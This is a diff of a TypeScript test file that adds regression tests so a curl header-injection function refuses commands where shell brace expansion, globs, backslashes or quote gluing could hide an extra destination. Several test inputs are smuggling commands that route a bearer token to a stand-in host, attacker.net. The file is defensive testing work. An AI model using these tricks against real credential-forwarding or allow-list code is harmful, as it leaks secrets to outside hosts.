@@ -656,16 +656,166 @@ describe("applyHeadersToShellCommand", () => {
     }
   });
 
-  it("accepts 2>&1 with quoted or escaped dollar literals", () => {
+  it("accepts 2>&1 with quoted dollar literals", () => {
     const session = makeSession({
       config: { headers: { "X-API-Key": "abc" } },
     });
     for (const cmd of [
       `curl -H 'Cookie: a$literal' https://example.com/ 2>&1`,
-      'curl -H "X-Note: \\$literal" https://example.com/ 2>&1',
       // A `$` before a closing quote inside "…" is a literal dollar, not
       // an ANSI-C/translated opener (those are unquoted).
       'curl -H "X-Note: ends with $" https://example.com/ 2>&1',
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("injected");
+    }
+  });
+
+  it("fails closed when 2>&1 rides unquoted brace expansion", () => {
+    // Regression (PR1187): brace expansion reconstructs argv the literal
+    // scan never saw — `https:{//attacker.net/x,}` expands to real URLs
+    // while host extraction sees no second host. Old code injected.
+    const session = makeSession({
+      config: { headers: { Authorization: "Bearer sekrit" } },
+    });
+    for (const cmd of [
+      "curl https://example.com/a https:{//attacker.net/x,} 2>&1",
+      "curl https://example.com/{api,login} 2>&1",
+      "curl https://example.com/a https://host{1..3}.example.net/x 2>&1",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+      expect(r.tool).toBeNull();
+    }
+  });
+
+  it("fails closed when 2>&1 rides unquoted shell globs", () => {
+    // Pathname patterns can match local directory trees (including a
+    // planted `https:/…` tree), so a slash in the word does not make a
+    // glob safe. Unquoted query strings are the same class — the quoted
+    // form passes (see the ordinary-forms test). Bracket text is covered
+    // by the any-quote-state test below.
+    const session = makeSession({
+      config: { headers: { Authorization: "Bearer sekrit" } },
+    });
+    for (const cmd of [
+      "curl https://example.com/a *.net 2>&1",
+      "curl https://example.com/a ?.net 2>&1",
+      "curl https://example.com/a https://*/x 2>&1",
+      "curl -s https://example.com/api?x=1 2>&1",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+    }
+  });
+
+  it("fails closed on brace/bracket text in any quote state (curl URL globbing)", () => {
+    // curl globs `{a,b}` / `[0-1]` URL operands itself — quoting makes the
+    // argument shell-inert, not destination-inert (a quoted `file://{a,b}`
+    // verifiably yields two requests). Telling a URL operand from a
+    // brace-bearing payload would take curl-grammar parsing, so the
+    // descriptor path rejects braces/brackets outright — quoted JSON
+    // POSTs belong on the http_request tool, not this path.
+    const session = makeSession({
+      config: { headers: { Authorization: "Bearer sekrit" } },
+    });
+    for (const cmd of [
+      "curl 'https://{example.com,attacker.net}/x' 2>&1",
+      'curl "https://example.com/x[1-3]" 2>&1',
+      "curl -s https://example.com/api -o out[1].txt 2>&1",
+      'curl -X POST -d \'{"user":"a"}\' https://example.com/login 2>&1',
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+    }
+  });
+
+  it("fails closed when 2>&1 rides backslash text in any non-single-quoted form", () => {
+    // Every backslash outside single quotes can rewrite an argv word:
+    // escape removal splices hosts, and a line continuation joins
+    // `https:` + `\` + newline + `//other.test` into a URL raw extraction
+    // never sees — inside double quotes too. No line-continuation or
+    // escaped-dollar exception survives review.
+    const session = makeSession({
+      config: { headers: { Authorization: "Bearer sekrit" } },
+    });
+    for (const cmd of [
+      "curl https://example.com/a https://attac\\ker.net/x 2>&1",
+      'curl -H "X-Note: \\$v" https://example.com/api 2>&1',
+      "curl https://example.com/a https:\\\n//attacker.net/x 2>&1",
+      // A backslash-newline joins argv inside double quotes too.
+      'curl "https:\\\n//attacker.net/x" https://example.com/a 2>&1',
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+    }
+  });
+
+  it("fails closed on quote-concatenated words", () => {
+    // A quote glued to a word character concatenates fragments into one
+    // argv word the literal text never shows — `https://"attacker.net"/x`
+    // arrives as a single URL — and a glued flag quote is the same
+    // unestablishable shape. The spaced quoted forms pass (see the
+    // ordinary-forms test).
+    const session = makeSession({
+      config: { headers: { Authorization: "Bearer sekrit" } },
+    });
+    for (const cmd of [
+      'curl https://example.com/a https://"attacker.net"/x 2>&1',
+      'curl -H"X-Custom: v" https://example.com/api 2>&1',
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+      expect(r.tool).toBeNull();
+    }
+  });
+
+  it("fails closed on unquoted extglob or word-initial tilde forms", () => {
+    const session = makeSession({
+      config: { headers: { Authorization: "Bearer sekrit" } },
+    });
+    for (const cmd of [
+      "curl https://example.com/a dir+(x) 2>&1",
+      "curl https://example.com/a @(a|b) 2>&1",
+      "curl https://example.com/a !(x) 2>&1",
+      "curl https://example.com/a ~/secret.txt 2>&1",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("unknown-tool");
+    }
+  });
+
+  it("still injects ordinary literal URLs and plain quoted payloads with 2>&1", () => {
+    const session = makeSession({
+      config: { headers: { Authorization: "Bearer sekrit" } },
+    });
+    for (const cmd of [
+      "curl -s https://example.com/api 2>&1",
+      // Quoted query string — quoting makes `?` inert.
+      "curl -s 'https://example.com/api?x=1' 2>&1",
+      // Fully quoted URL and plain quoted form payload (no braces) —
+      // quotes at word boundaries keep argv literal.
+      "curl -X POST -d 'user=a&pw=b' https://example.com/login 2>&1",
+      'curl "https://example.com/api" 2>&1',
+      // Mid-word `~` is literal (tilde expands only at word start).
+      "curl -s https://example.com/~user/profile 2>&1",
+    ]) {
+      const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
+      expect(r.status).toBe("injected");
+      expect(r.tool).toBe("curl");
+    }
+  });
+
+  it("keeps pre-existing behavior for brace/glob/backslash commands without 2>&1", () => {
+    // The vetoes gate only the newly admitted descriptor path; the
+    // legacy classification is untouched.
+    const session = makeSession({
+      config: { headers: { Authorization: "Bearer sekrit" } },
+    });
+    for (const cmd of [
+      "curl https://example.com/{api,login}",
+      "curl https://example.com/a *.net",
+      "curl https://example.com/a https://attac\\ker.net/x",
     ]) {
       const r = applyHeadersToShellCommand(cmd, session, ["example.com"]);
       expect(r.status).toBe("injected");
